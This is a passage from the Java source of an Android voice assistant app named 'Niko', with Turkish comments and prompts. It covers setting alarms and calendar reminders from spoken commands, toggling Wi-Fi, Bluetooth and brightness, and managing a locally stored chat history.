					minute = 30;
				}
			}

			// PM (Öğleden sonra) Düzeltmesi (12 saatlik formatı 24'e çevir)
			if (pm && hour != -1 && hour < 12) {
				hour += 12;
			}
		}

		if (hour != -1) {
			Intent i = new Intent(AlarmClock.ACTION_SET_ALARM);
			i.putExtra(AlarmClock.EXTRA_HOUR, hour);
			i.putExtra(AlarmClock.EXTRA_MINUTES, minute);
			i.putExtra(AlarmClock.EXTRA_MESSAGE, "Niko Alarm");
			i.putExtra(AlarmClock.EXTRA_SKIP_UI, true);
			startActivity(i);
			speak(String.format(Locale.getDefault(), "Alarm saat %02d:%02d için kuruldu", hour, minute));
		} else {
			// Saat anlaşılamazsa var olan alarmları göster
			Intent i = new Intent(AlarmClock.ACTION_SHOW_ALARMS);
			startActivity(i);
			speak("Saati tam anlayamadım, alarm listesini açıyorum.");
		}
	}

	private void setReminder(String cmd) {
		String clean = cmd.toLowerCase(new Locale("tr", "TR"));
		Calendar cal = Calendar.getInstance();
		boolean timeFound = false;

		// 1. GÜN: "yarın" kontrolü
		if (clean.contains("yarın")) {
			cal.add(Calendar.DAY_OF_YEAR, 1);
		}

		// 2. SAAT: Metin içinden saati bulma
		int hour = -1;
		int minute = 0;
		boolean pm = clean.contains("akşam") || clean.contains("gece") || clean.contains("öğleden sonra");
		boolean half = clean.contains("buçuk");

		Pattern p1 = Pattern.compile("(\\d{1,2})[.:\\s](\\d{2})");
		Matcher m1 = p1.matcher(clean);

		if (m1.find()) {
			hour = Integer.parseInt(m1.group(1));
			minute = Integer.parseInt(m1.group(2));
			timeFound = true;
		} else {
			Pattern p2 = Pattern.compile("saat\\s*(\\d{1,2})");
			Matcher m2 = p2.matcher(clean);
			if (m2.find()) {
				hour = Integer.parseInt(m2.group(1));
				timeFound = true;
			} else if (pm) {
				// "akşam 8'de"
				Pattern p3 = Pattern.compile("(\\d{1,2})");
				Matcher m3 = p3.matcher(clean);
				if (m3.find()) {
					hour = Integer.parseInt(m3.group(1));
					timeFound = true;
				}
			}
		}

		if (timeFound)

		{
			if (half)
				minute = 30;
			if (pm && hour < 12)
				hour += 12;

			cal.set(Calendar.HOUR_OF_DAY, hour);
			cal.set(Calendar.MINUTE, minute);
			cal.set(Calendar.SECOND, 0);
		}

		// Başlık Temizliği (Komuttan sadece hatırlatılacak metni çıkarmaya çalışır)
		String title = clean.replace("hatırlatıcı", "").replace("hatırlat", "").replace("bana", "").replace("ekle", "")
				.replace("anımsat", "").replace("kur", "").replace("yarın", "") // Tarih bilgisini başlıktan çıkar
				.replace("bugün", "").replace("saat", "").replaceAll("\\d", "") // Sayıları da kabaca temizle
				.replace("buçuk", "").replace("akşam", "").replace("gece", "").replace("sabah", "").replace("de", "")
				.replace("da", "").replace(" te", "").replace(" ta", "").trim();

		if (title.isEmpty())
			title = "Hatırlatma";

		// İlk harfi büyüt
		if (title.length() > 0)
			title = title.substring(0, 1).toUpperCase() + title.substring(1);

		try {
			Intent intent = new Intent(Intent.ACTION_INSERT).setData(CalendarContract.Events.CONTENT_URI)
					.putExtra(CalendarContract.Events.TITLE, title)
					.putExtra(CalendarContract.Events.DESCRIPTION, "Niko Asistan Eklemesi");

			// Eğer saat bulunduysa o saate, bulunmadıysa tüm güne falan ayarlanabilir
			// (burada saat
			// şartı var)
			if (timeFound) {
				intent.putExtra(CalendarContract.EXTRA_EVENT_BEGIN_TIME, cal.getTimeInMillis());
				intent.putExtra(CalendarContract.EXTRA_EVENT_END_TIME, cal.getTimeInMillis() + 60 * 60 * 1000); // Varsayılan
				// 1
				// saat
			}
			startActivity(intent);

			String timeStr = timeFound ? String.format(Locale.getDefault(), " %02d:%02d", hour, minute) : "";
			String dayStr = clean.contains("yarın") ? " yarın" : "";
			speak("Hatırlatıcı" + dayStr + timeStr + " için açılıyor: " + title);

		} catch (Exception e) {
			speak("Takvim uygulaması bulunamadı.");
		}
	}

	// ================= SİSTEM KONTROLLERİ (WIFI / BLUETOOTH / PARLAKLIK)
	// =================

	private void controlWifi(boolean enable) {
		if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
			// Android 10 ve üzeri (SDK >= 29) için Panel açma
			// Android 10'da programatik Wi-Fi açma/kapama kısıtlandı.
			Intent panelIntent = new Intent(Settings.Panel.ACTION_INTERNET_CONNECTIVITY);
			startActivityForResult(panelIntent, 0);
			speak("Android 10 ve üzeri cihazlarda Wi-Fi ayarlar paneli açılıyor...");
		} else {
			// Eski sürümler için doğrudan WifiManager ile kontrol
			WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
			if (wifiManager != null) {
				wifiManager.setWifiEnabled(enable);
				speak(enable ? "Wi-Fi açıldı" : "Wi-Fi kapatıldı");
			} else {
				speak("Wi-Fi servisine erişilemedi.");
			}
		}
	}

	private void controlBluetooth(boolean enable) {
		BluetoothAdapter bluetoothAdapter = BluetoothAdapter.getDefaultAdapter();
		if (bluetoothAdapter == null) {
			speak("Bu cihazda Bluetooth desteklenmiyor.");
			return;
		}

		// Android 12 (SDK 31) ve üzeri için ekstra izin kontrolü
		if (Build.VERSION.SDK_INT >= 31) {
			if (checkSelfPermission(Manifest.permission.BLUETOOTH_CONNECT) != PackageManager.PERMISSION_GRANTED) {
				requestPermissions(new String[] { Manifest.permission.BLUETOOTH_CONNECT }, PERMISSION_CODE);
				speak("Bluetooth izni gerekli.");
				return;
			}
		}

		if (enable) {
			if (!bluetoothAdapter.isEnabled()) {
				bluetoothAdapter.enable(); // Not: Bazı yeni Android sürümlerinde sadece panel açılabiliyor olabilir
				speak("Bluetooth açılıyor");
			} else {
				speak("Bluetooth zaten açık");
			}
		} else {
			if (bluetoothAdapter.isEnabled()) {
				bluetoothAdapter.disable();
				speak("Bluetooth kapatılıyor");
			} else {
				speak("Bluetooth zaten kapalı");
			}
		}
	}

	private void controlBrightness(boolean increase) {
		// Android 6.0 ve üzeri için "Ayarları Yazma" izni kontrolü
		if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
			if (!Settings.System.canWrite(this)) {
				Intent intent = new Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS);
				intent.setData(Uri.parse("package:" + getPackageName()));
				intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
				startActivity(intent);
				speak("Bunun için sistem ayarlarını değiştirme izni vermelisiniz.");
				return;
			}
		}

		try {
			int currentBrightness = Settings.System.getInt(getContentResolver(), Settings.System.SCREEN_BRIGHTNESS);
			int newBrightness = currentBrightness;

			if (increase) {
				newBrightness = Math.min(255, currentBrightness + 50);
			} else {
				newBrightness = Math.max(0, currentBrightness - 50);
			}

			// Sistem ayarını güncelle
			Settings.System.putInt(getContentResolver(), Settings.System.SCREEN_BRIGHTNESS, newBrightness);

			// Ekran parlaklığını anlık uygula (Activity penceresi için)
			Window window = getWindow();
			WindowManager.LayoutParams layoutParams = window.getAttributes();
			layoutParams.screenBrightness = newBrightness / 255.0f;
			window.setAttributes(layoutParams);

			speak(increase ? "Parlaklık arttırıldı" : "Parlaklık azaltıldı");

		} catch (Settings.SettingNotFoundException e) {
			e.printStackTrace();
			speak("Parlaklık ayarına ulaşılamadı.");
		}
	}

	private boolean isNetworkAvailable() {
		try {
			ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
			NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
			return activeNetwork != null && activeNetwork.isConnectedOrConnecting();
		} catch (Exception e) {
			// İzin hatası vs olursa varsayılan olarak true dön, askAI hata versin
			return true;
		}
	}

	// ================= SOHBET GEÇMİŞİ (CHAT HISTORY) =================

	/**
	* Mesajı yerel hafızaya kaydeder.
	*/
	private void saveToHistory(String sender, String message) {
		// Boş veya çok kısa mesajları kaydetme
		if (message == null || message.trim().isEmpty() || message.trim().length() < 2) {
			return;
		}

		new Thread(() -> {
			synchronized (historyLock) {
				try {
					String currentHistory = historyPrefs.getString("data", "[]");
					JSONArray historyArray = new JSONArray(currentHistory);

					JSONObject entry = new JSONObject();
					entry.put("sender", sender);
					entry.put("message", message.trim());
					entry.put("timestamp", System.currentTimeMillis());
					entry.put("date", new SimpleDateFormat("dd/MM/yyyy", Locale.getDefault()).format(new Date()));
					entry.put("time", new SimpleDateFormat("HH:mm", Locale.getDefault()).format(new Date()));

					historyArray.put(entry);

					// Son MAX_HISTORY_ITEMS mesajı tut
					if (historyArray.length() > MAX_HISTORY_ITEMS) {
						JSONArray newArray = new JSONArray();
						for (int i = historyArray.length() - MAX_HISTORY_ITEMS; i < historyArray.length(); i++) {
							newArray.put(historyArray.get(i));
						}
						historyArray = newArray;
					}

					historyPrefs.edit().putString("data", historyArray.toString()).apply();
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}).start();
	}

	/**
	* Geçmiş panelini doldurur ve gösterir.
	*/
	private void showHistory(String filter) {
		runOnUiThread(() -> {
			if (layoutHistory.getVisibility() != View.VISIBLE) {
				animateHistoryIn();
			}
			containerHistoryItems.removeAllViews();
			layoutHistory.setVisibility(View.VISIBLE);
		});

		new Thread(() -> {
			synchronized (historyLock) {
				try {
					String currentHistory = historyPrefs.getString("data", "[]");
					JSONArray historyArray = new JSONArray(currentHistory);

					if (historyArray.length() == 0) {
						runOnUiThread(() -> {
							addEmptyStateUI();
							txtHistoryStats.setText("0 mesaj");
						});
						return;
					}

					String lastDate = "";
					int visibleCount = 0;
					String finalFilter = filter.toLowerCase(Locale.getDefault());

					for (int i = historyArray.length() - 1; i >= 0; i--) {
						JSONObject entry = historyArray.getJSONObject(i);
						String sender = entry.getString("sender");
						String message = entry.getString("message");
						String time = entry.optString("time", "--:--");
						String currentDate = entry.optString("date", "");

						if (!finalFilter.isEmpty()) {
							if (!message.toLowerCase(Locale.getDefault()).contains(finalFilter)
									&& !sender.toLowerCase(Locale.getDefault()).contains(finalFilter)) {
								continue;
							}
						}

						visibleCount++;
						final int index = i;
						final String filterText = finalFilter;

						if (finalFilter.isEmpty() && !currentDate.equals(lastDate) && !currentDate.isEmpty()) {
							String dateToShow = currentDate;
							runOnUiThread(() -> addDateHeaderUI(dateToShow));
							lastDate = currentDate;
						}

						final String displayTime = finalFilter.isEmpty() ? time : currentDate + " " + time;
						runOnUiThread(() -> addHistoryItemToUI(sender, message, displayTime, index, filterText));
					}

					final int finalVisibleCount = visibleCount;
					runOnUiThread(() -> {
						if (finalVisibleCount == 0 && !finalFilter.isEmpty()) {
							addNoResultUI();
						}
						txtHistoryStats.setText(finalVisibleCount + " mesaj");
					});

				} catch (Exception e) {
					e.printStackTrace();
					runOnUiThread(
							() -> Toast.makeText(MainActivity.this, "Geçmiş yüklenemedi", Toast.LENGTH_SHORT).show());
				}
			}
		}).start();
	}

	private void addNoResultUI() {
		TextView noResult = new TextView(this);
		noResult.setText("Sonuç bulunamadı.");
		noResult.setTextColor(Color.parseColor("#55FFFFFF"));
		noResult.setTextSize(14);
		noResult.setGravity(android.view.Gravity.CENTER);
		noResult.setPadding(0, 64, 0, 0);
		containerHistoryItems.addView(noResult);
	}

	private void animateHistoryIn() {
		AnimationSet set = new AnimationSet(true);
		TranslateAnimation slide = new TranslateAnimation(0, 0, 1000, 0);
		AlphaAnimation fade = new AlphaAnimation(0, 1);
		set.addAnimation(slide);
		set.addAnimation(fade);
		set.setDuration(400);
		layoutHistory.startAnimation(set);
	}

	private void hideHistory() {
		// Eğer zaten gizliyse veya kapanıyorsa işlem yapma
		if (layoutHistory.getVisibility() != View.VISIBLE)
			return;

		// Klavyeyi gizle
		InputMethodManager imm = (InputMethodManager) getSystemService(Context.INPUT_METHOD_SERVICE);
		if (imm != null && edtHistorySearch != null)
			imm.hideSoftInputFromWindow(edtHistorySearch.getWindowToken(), 0);

		AnimationSet set = new AnimationSet(true);
		TranslateAnimation slide = new TranslateAnimation(0, 0, 0, 1200);
		AlphaAnimation fade = new AlphaAnimation(1, 0);
		set.addAnimation(slide);
		set.addAnimation(fade);
		set.setDuration(300);

		set.setAnimationListener(new Animation.AnimationListener() {
			@Override
			public void onAnimationStart(Animation animation) {
			}

			@Override
			public void onAnimationEnd(Animation animation) {
				layoutHistory.setVisibility(View.GONE);
				if (edtHistorySearch != null)
					edtHistorySearch.setText("");
			}

			@Override
			public void onAnimationRepeat(Animation animation) {
			}
		});

		layoutHistory.startAnimation(set);
	}

	private int getHistoryCount() {
		synchronized (historyLock) {
			try {
				String currentHistory = historyPrefs.getString("data", "[]");
				return new JSONArray(currentHistory).length();
			} catch (Exception e) {
				return 0;
			}
		}
	}

	/**
	* Tarih başlığı ekler (örn: "05/01/2026")
	*/
	private void addDateHeaderUI(String date) {
		LinearLayout.LayoutParams headerParams = new LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT,
				ViewGroup.LayoutParams.WRAP_CONTENT);
		headerParams.setMargins(0, 16, 0, 16);

		TextView dateHeader = new TextView(this);
		dateHeader.setText(formatDateHeader(date));
		dateHeader.setTextColor(Color.parseColor("#88FFFFFF"));
		dateHeader.setTextSize(14);
		dateHeader.setGravity(android.view.Gravity.CENTER);
		dateHeader.setAllCaps(true);
		dateHeader.setLetterSpacing(0.15f);
		dateHeader.setLayoutParams(headerParams);
		dateHeader.setPadding(0, 8, 0, 8);

		containerHistoryItems.addView(dateHeader);
	}

	/**
	* Tarihi daha okunabilir formata çevirir
	*/
	private String formatDateHeader(String date) {
		try {
			SimpleDateFormat inputFormat = new SimpleDateFormat("dd/MM/yyyy", Locale.getDefault());
			SimpleDateFormat outputFormat = new SimpleDateFormat("dd MMMM yyyy, EEEE", new Locale("tr", "TR"));
			Date parsedDate = inputFormat.parse(date);

			// Bugün mü kontrol et
			SimpleDateFormat todayFormat = new SimpleDateFormat("dd/MM/yyyy", Locale.getDefault());
			String today = todayFormat.format(new Date());
			if (date.equals(today)) {
				return "BUGÜN";
			}

			return outputFormat.format(parsedDate).toUpperCase(new Locale("tr", "TR"));
		} catch (Exception e) {
			return date;
		}
	}

	/**
	* Boş durum UI'ı ekler
	*/
	private void addEmptyStateUI() {
		TextView emptyText = new TextView(this);
		emptyText.setText("Henüz sohbet geçmişi yok\n\nBenimle konuşmaya başla!");
		emptyText.setTextColor(Color.parseColor("#88FFFFFF"));
		emptyText.setTextSize(16);
		emptyText.setGravity(android.view.Gravity.CENTER);
		emptyText.setPadding(32, 64, 32, 64);
		emptyText.setLineSpacing(8, 1.3f);
		containerHistoryItems.addView(emptyText);
	}

	/**
	* Tek bir geçmiş öğesini arayüz (UI) içine ekler.
	*/
	private void addHistoryItemToUI(String sender, String message, String time, int index, String filter) {
		LinearLayout.LayoutParams cardParams = new LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT,
				ViewGroup.LayoutParams.WRAP_CONTENT);
		cardParams.setMargins(0, 0, 0, 16);

		LinearLayout itemLayout = new LinearLayout(this);
		itemLayout.setOrientation(LinearLayout.VERTICAL);
		itemLayout.setPadding(20, 20, 20, 20);
		itemLayout.setBackgroundResource(R.drawable.ai_response_bg);
		itemLayout.setLayoutParams(cardParams);
		itemLayout.setClickable(true);
		itemLayout.setFocusable(true);

		// Kısa basınca metni kopyala
		itemLayout.setOnClickListener(v -> {
			ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
			ClipData clip = ClipData.newPlainText("niko_msg", message);
			clipboard.setPrimaryClip(clip);
			Toast.makeText(this, "Mesaj kopyalandı.", Toast.LENGTH_SHORT).show();
		});

		// Uzun basınca tekli silme
		itemLayout.setOnLongClickListener(v -> {
			deleteSingleHistoryItem(index);
			return true;
		});

		// Sender ve zaman bilgisi
		TextView txtSender = new TextView(this);
		txtSender.setText(sender + " • " + time);
		txtSender.setTextColor(sender.equals("Ben") ? Color.parseColor("#00E5FF") : Color.parseColor("#FFCC00"));
		txtSender.setTextSize(12);
		txtSender.setAlpha(0.85f);
		txtSender.setAllCaps(true);
		txtSender.setLetterSpacing(0.12f);
		txtSender.setTypeface(null, android.graphics.Typeface.BOLD);

		// Mesaj içeriği (Vurgulama eklendi)
		TextView txtMsg = new TextView(this);
		if (filter != null && !filter.isEmpty()) {
			SpannableString spannable = new SpannableString(message);
			String lowerMsg = message.toLowerCase(Locale.getDefault());
			int start = lowerMsg.indexOf(filter);
			while (start >= 0) {
				int end = start + filter.length();
				spannable.setSpan(new BackgroundColorSpan(Color.parseColor("#4400E5FF")), start, end,
						Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
				start = lowerMsg.indexOf(filter, end);
			}
			txtMsg.setText(spannable);
		} else {
			txtMsg.setText(message);
		}

		txtMsg.setTextColor(Color.WHITE);
		txtMsg.setTextSize(16);
		txtMsg.setPadding(0, 10, 0, 0);
		txtMsg.setLineSpacing(6, 1.25f);

		itemLayout.addView(txtSender);
		itemLayout.addView(txtMsg);
		containerHistoryItems.addView(itemLayout);
	}

	/**
	* Tek bir öğeyi indekse göre siler.
	*/
	private void deleteSingleHistoryItem(int index) {
		synchronized (historyLock) {
			try {
				String currentHistory = historyPrefs.getString("data", "[]");
				JSONArray historyArray = new JSONArray(currentHistory);

				if (index < 0 || index >= historyArray.length())
					return;

				JSONObject entry = historyArray.getJSONObject(index);
				String messageSnippet = entry.optString("message", "");
				if (messageSnippet.length() > 40)
					messageSnippet = messageSnippet.substring(0, 37) + "...";

				String finalSnippet = messageSnippet;
				runOnUiThread(() -> {
					new android.app.AlertDialog.Builder(this, android.R.style.Theme_DeviceDefault_Dialog_Alert)
							.setTitle("Mesajı Sil")
							.setMessage("\"" + finalSnippet + "\"\n\nBu mesajı geçmişten silmek istiyor musunuz?")
							.setIcon(android.R.drawable.ic_menu_delete).setPositiveButton("Sil", (dialog, which) -> {
								new Thread(() -> {
									synchronized (historyLock) {
										try {
											String latestHistory = historyPrefs.getString("data", "[]");
											JSONArray latestArray = new JSONArray(latestHistory);

											if (index >= 0 && index < latestArray.length()) {
												if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
													latestArray.remove(index);
												} else {
													JSONArray newList = new JSONArray();
													for (int i = 0; i < latestArray.length(); i++) {
														if (i != index)
															newList.put(latestArray.get(i));
													}
													latestArray = newList;
												}
												historyPrefs.edit().putString("data", latestArray.toString()).apply();

												runOnUiThread(() -> {
													showHistory(edtHistorySearch.getText().toString());
													Toast.makeText(this, "Mesaj silindi", Toast.LENGTH_SHORT).show();
												});
											}
										} catch (Exception e) {
											e.printStackTrace();
										}
									}
								}).start();
							}).setNegativeButton("Vazgeç", null).show();
				});
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}

	/**
	* Tüm geçmişi siler. (Thread-safe ve Gelişmiş UI Geri Bildirimi)
	*/
	private void clearHistory() {
		// Zaten boşsa işlem yapma
		if (getHistoryCount() == 0) {
			Toast.makeText(this, "Temizlenecek bir geçmiş bulunamadı.", Toast.LENGTH_SHORT).show();
			return;
		}

		new android.app.AlertDialog.Builder(this, android.R.style.Theme_DeviceDefault_Dialog_Alert)
				.setTitle("Geçmişi Temizle")
				.setMessage("Tüm sohbet geçmişini silmek istediğinize emin misiniz? Bu işlem geri alınamaz.")
				.setIcon(android.R.drawable.ic_dialog_alert).setPositiveButton("Hepsini Sil", (dialog, which) -> {
					// Veri güvenliği için kilitleme kullan
					synchronized (historyLock) {
						historyPrefs.edit().clear().apply();
					}

					// Arayüzü güncelle
					runOnUiThread(() -> {
						containerHistoryItems.removeAllViews();
						addEmptyStateUI();
						if (txtHistoryStats != null) {
							txtHistoryStats.setText("0 mesaj");
						}
						Toast.makeText(this, "Sohbet geçmişi tamamen temizlendi", Toast.LENGTH_SHORT).show();
					});
				}).setNegativeButton("Vazgeç", null).show();
	}

	@Override
	protected void onDestroy() {
		super.onDestroy();
		// Uygulama kapanırken kaynakları serbest bırak
		if (speechRecognizer != null)
			speechRecognizer.destroy();
		if (tts != null)
			tts.shutdown();
	}
}
